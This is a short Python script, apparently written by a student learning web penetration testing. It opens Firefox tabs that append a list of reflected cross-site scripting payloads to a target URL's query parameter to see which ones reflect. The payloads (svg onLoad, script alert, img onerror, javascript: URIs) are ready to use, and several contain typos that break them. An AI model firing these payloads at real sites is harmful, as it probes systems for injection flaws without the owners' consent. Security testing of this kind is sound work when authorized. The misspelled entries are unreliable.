#THIS IS IS A SMALL PROCESS TO FIND XSS MANUALLU WITHOUT USIN ANY TOOLS .
#YOU HAVE TO JUST SET URL AND THEN RUN THIS AUTOXSS.PY FILE 
#THEN ITS WILL OPEN AROUND 25 TAB IN BROWESER FIREFOX. 
#THEN WHICH PAYLOADS IS REFLECTED THAT YOU CAN CATHCHED EASILY THROUGH THIS METHOD 



import subprocess


payloads = [ "<svG onLoad=prompt(9)>", """x"><svG onLoad=prompt(9)>""", """x"><svG onLoad=alert('OPENBUGBOUNTY')>""", """" autofocus onfocus="promt(/'OPENBUGBOUNTY/)""", 
"</span><svG onLoad=prompt(9)>","""x"><svG onLoad=alert(/OPENBUGBOUNTY/)>""","</title><svG onLoad=prompt(9)>","</span><svG onLoad=prompt(9)>",
"</div><svG onLoad=prompt(9)>","</textarea><svG onLoad=prompt(9)>","</h1><svG onLoad=prompt(9)>","--><svG onLoad=prompt(9)>","</script><svG onLoad=prompt(9)>",
"</script><script>alert(1)</script>","""1'"><img/src/onerror=.1|alert``>""","""1'"><img onLoad=prompt(9)``>""",""""><script>alert(/OPENBUGBOUNTY/)</script>""",""""><script>alert(1)</script>""",
"\www.openbugbounty.org","--><script>alert(/openbugbounty/)</script>","javascript:alert('xss')","javascript:alert(2)","javascript:alert(/openbugbounty/)","""">img src=x onerror=alert(1)>""",""""><img src=x onerror=promt(XSSPOSED)>""","javaSCRIPT&colon;alert(/XSS/)","""<a+href="ja%0A%0Dvascript:alert(document.domain)">Click</a>""",]

for perpayloads in payloads:

    subprocess.call([r'/usr/bin/firefox','-new-tab', "https://URL....?s="+perpayloads ])
    #subprocess.call([r'/usr/bin/firefox','-new-tab', "https:/URL...s="+perpayloads+"UR;L..."])

   
  
  
  
  
  
  
  
  
  
  
  
  
#HELLO FRINDS I AM PINKY . I AM FIRST YEAR IN BCA . I AM LEARNING PYTHON AND WEB SECURITY penetration TESTING  



